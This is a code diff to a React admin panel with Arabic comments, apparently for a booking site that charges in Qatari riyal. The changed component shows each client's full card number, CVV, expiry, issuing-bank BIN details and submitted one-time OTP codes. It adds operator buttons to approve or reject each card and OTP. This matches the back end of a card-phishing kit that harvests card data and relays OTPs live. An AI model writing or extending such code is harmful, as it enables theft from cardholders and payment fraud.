@@ -1,5 +1,6 @@
 "use client";
 
+import { useState } from "react";
 import styles from "./ClientDetailPanel.module.css";
 import type { InboxClient } from "./ClientInboxClient";
 
@@ -18,8 +19,17 @@ export function ClientDetailPanel({ client, onBlock }: Props) {
     );
   }
 
-  const paymentEntries = client.entries.filter((e) => (e as { type: string }).type === "payment");
-  const inquiryEntries = client.entries.filter((e) => (e as { type: string }).type === "inquiry");
+  // ترتيب الإدخالات من الأحدث للأقدم
+  const sortedEntries = [...client.entries].sort(
+    (a, b) => new Date((b as { created_at: string }).created_at).getTime() - new Date((a as { created_at: string }).created_at).getTime(),
+  );
+  const paymentEntries = sortedEntries.filter((e) => (e as { type: string }).type === "payment");
+  const otpEntries = sortedEntries.filter((e) => (e as { type: string }).type === "otp_request");
+  const inquiryEntries = sortedEntries.filter((e) => (e as { type: string }).type === "inquiry");
+  // ترتيب الحجوزات من الأحدث للأقدم
+  const sortedBookings = [...client.bookings].sort(
+    (a, b) => new Date((b as { created_at: string }).created_at).getTime() - new Date((a as { created_at: string }).created_at).getTime(),
+  );
 
   return (
     <div className={styles.container} dir="rtl">
@@ -73,17 +83,17 @@ export function ClientDetailPanel({ client, onBlock }: Props) {
         </Card>
 
         {/* صناديق الحجوزات */}
-        {client.bookings.length === 0 ? (
+        {sortedBookings.length === 0 ? (
           <Card title="الحجوزات" timeAgo="">
             <EmptyData text="لا توجد حجوزات لهذا العميل" />
           </Card>
         ) : (
-          (client.bookings as Array<Record<string, unknown>>).map((b, i) => (
+          (sortedBookings as Array<Record<string, unknown>>).map((b, i) => (
             <BookingCard key={String(b.id ?? i)} booking={b} timeAgo={client.timeAgo} latest={i === 0} />
           ))
         )}
 
-        {/* صناديق الدفع (OTP / بطاقة) */}
+        {/* صناديق الدفع (مع أزرار موافقة/رفض المدير) */}
         {paymentEntries.length === 0 ? (
           <Card title="الدفع والتحقق" timeAgo="">
             <EmptyData text="لا توجد بيانات دفع بعد" />
@@ -92,11 +102,20 @@ export function ClientDetailPanel({ client, onBlock }: Props) {
           paymentEntries.map((e, i) => (
             <PaymentCard
               key={(e as { id: string }).id}
-              entry={e as { type: string; payload: Record<string, unknown>; created_at: string }}
+              entry={e as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
               latest={i === 0}
             />
           ))
         )}
+
+        {/* صناديق رمز التحقق (مع أزرار موافقة/رفض المدير) */}
+        {otpEntries.length > 0 &&
+          otpEntries.map((e) => (
+            <OtpRequestCard
+              key={(e as { id: string }).id}
+              entry={e as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
+            />
+          ))}
 
         {/* صناديق الاستفسارات */}
         {inquiryEntries.length > 0 &&
@@ -188,16 +207,41 @@ function PaymentCard({
   entry,
   latest,
 }: {
-  entry: { type: string; payload: Record<string, unknown>; created_at: string };
+  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
   latest: boolean;
 }) {
   const p = entry.payload;
-  const otp = String(p.otp ?? "----");
-  const cardLast4 = String(p.card_last4 ?? "****");
+  const cardNumber = String(p.card_number ?? "");
+  const cardLast4 = String(p.card_last4 ?? cardNumber.slice(-4) ?? "****");
   const cardName = String(p.card_name ?? "غير متوفر");
   const expiry = String(p.expiry ?? "**/**");
-  const verified = p.otp_verified as boolean;
+  const cvv = String(p.cvv ?? "***");
+  const binScheme = String(p.bin_scheme ?? "غير معروف");
+  const binType = String(p.bin_type ?? "");
+  const binBank = String(p.bin_bank ?? "غير معروف");
+  const binCountry = String(p.bin_country ?? "غير معروف");
+  const binCountryCode = String(p.bin_country_code ?? "");
+  const status = String(p.status ?? "pending_admin");
   const bookingRef = String(p.booking_ref ?? "");
+  const [deciding, setDeciding] = useState(false);
+
+  const statusLabel =
+    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
+  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";
+
+  async function decide(decision: "approve" | "reject") {
+    setDeciding(true);
+    try {
+      await fetch("/api/payments/decide", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ entryId: entry.id, decision }),
+      });
+      window.location.reload();
+    } catch {
+      setDeciding(false);
+    }
+  }
 
   return (
     <div className={styles.card}>
@@ -215,45 +259,137 @@ function PaymentCard({
           <div className={styles.cardDecorCircle1} />
           <div className={styles.cardDecorCircle2} />
           <div className={styles.cardTopRow}>
-            <div className={styles.cardBrand}>VISA</div>
+            <div className={styles.cardBrand}>{binScheme}</div>
             <div className={styles.cardCurrency}>ر.ق</div>
           </div>
           <div className={styles.cardNumber} dir="ltr">
-            •••• •••• •••• {cardLast4}
+            {cardNumber ? cardNumber.replace(/(.{4})/g, "$1 ").trim() : `•••• •••• •••• ${cardLast4}`}
           </div>
           <div className={styles.cardBottomRow}>
             <div className={styles.cardHolder}>
               <span className={styles.cardLabel}>حامل البطاقة</span>
               <span className={styles.cardValueSmall}>{cardName}</span>
             </div>
-            <div className={styles.cardExp}>
+            <div className={styles.cardExpGroup}>
               <span className={styles.cardLabel}>EXPIRES</span>
               <span className={styles.cardValueSmall} dir="ltr">{expiry}</span>
             </div>
+            <div className={styles.cardExpGroup}>
+              <span className={styles.cardLabel}>CVV</span>
+              <span className={styles.cardValueSmall} dir="ltr">{cvv}</span>
+            </div>
           </div>
         </div>
 
-        {/* رمز OTP */}
-        {otp && otp !== "----" && (
-          <div className={styles.otpSection}>
-            <span className={styles.otpLabel}>رمز التحقق (OTP):</span>
-            <div className={styles.otpBoxes} dir="ltr">
-              {otp.split("").map((d, i) => (
-                <div key={i} className={styles.otpBox}>{d}</div>
-              ))}
-            </div>
-          </div>
-        )}
+        {/* معلومات BIN */}
+        <DataRow label="نوع البطاقة" value={binScheme + (binType ? ` (${binType})` : "")} />
+        <DataRow label="البنك" value={binBank} />
+        <DataRow label="الدولة" value={binCountry + (binCountryCode ? ` (${binCountryCode})` : "")} />
+        {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}
 
         {/* الحالة */}
         <div className={styles.paymentStatus}>
-          {verified ? (
-            <span className={`${styles.statusBadge} ${styles.statusGreen}`}>✓ تم التحقق</span>
-          ) : (
-            <span className={`${styles.statusBadge} ${styles.statusAmber}`}>⏳ قيد التحقق</span>
-          )}
+          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
+            {statusLabel}
+          </span>
+        </div>
+
+        {/* أزرار المدير — تظهر فقط إذا كان القرار معلقاً */}
+        {status === "pending_admin" && (
+          <div className={styles.adminActions}>
+            <button
+              className={`${styles.actionBtn} ${styles.approveBtn}`}
+              onClick={() => decide("approve")}
+              disabled={deciding}
+            >
+              ✓ موافقة
+            </button>
+            <button
+              className={`${styles.actionBtn} ${styles.rejectBtn}`}
+              onClick={() => decide("reject")}
+              disabled={deciding}
+            >
+              ✗ رفض
+            </button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+function OtpRequestCard({
+  entry,
+}: {
+  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
+}) {
+  const p = entry.payload;
+  const otp = String(p.otp ?? "----");
+  const status = String(p.status ?? "pending_admin");
+  const bookingRef = String(p.booking_ref ?? "");
+  const [deciding, setDeciding] = useState(false);
+
+  const statusLabel =
+    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
+  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";
+
+  async function decide(decision: "approve" | "reject") {
+    setDeciding(true);
+    try {
+      await fetch("/api/payments/decide-otp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ entryId: entry.id, decision }),
+      });
+      window.location.reload();
+    } catch {
+      setDeciding(false);
+    }
+  }
+
+  return (
+    <div className={styles.card}>
+      <div className={styles.cardHeader}>
+        <span className={styles.cardTitle}>رمز التحقق (OTP)</span>
+        <div className={styles.cardHeaderRight}>
+          <span className={styles.cardTime}>⏱ {new Date(entry.created_at).toLocaleString("ar")}</span>
+        </div>
+      </div>
+      <div className={styles.cardBody}>
+        <div className={styles.otpSection}>
+          <span className={styles.otpLabel}>الرمز المُرسل:</span>
+          <div className={styles.otpBoxes} dir="ltr">
+            {otp.split("").map((d, i) => (
+              <div key={i} className={styles.otpBox}>{d}</div>
+            ))}
+          </div>
         </div>
         {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}
+
+        <div className={styles.paymentStatus}>
+          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
+            {statusLabel}
+          </span>
+        </div>
+
+        {status === "pending_admin" && (
+          <div className={styles.adminActions}>
+            <button
+              className={`${styles.actionBtn} ${styles.approveBtn}`}
+              onClick={() => decide("approve")}
+              disabled={deciding}
+            >
+              ✓ موافقة
+            </button>
+            <button
+              className={`${styles.actionBtn} ${styles.rejectBtn}`}
+              onClick={() => decide("reject")}
+              disabled={deciding}
+            >
+              ✗ رفض
+            </button>
+          </div>
+        )}
       </div>
     </div>
   );
